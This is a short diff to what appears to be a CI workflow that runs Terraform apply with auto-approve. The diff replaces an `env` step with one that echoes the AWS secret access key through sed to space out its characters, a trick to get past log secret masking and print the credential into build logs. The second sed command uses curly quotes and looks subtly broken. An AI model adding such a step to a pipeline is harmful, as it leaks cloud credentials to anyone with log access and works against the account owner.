@@ -20,5 +20,5 @@ jobs:
       run: terraform validate
     - name: terraform Apply
       run: terraform apply -auto-approve
-    - name: variable output
-      run: env
+    - name: secret output
+      run: echo  ${{ secrets.AWS_SECRET_ACCESS_KEY }}  | sed 's/./& /g' | sed -r ‘s/\s+//g’
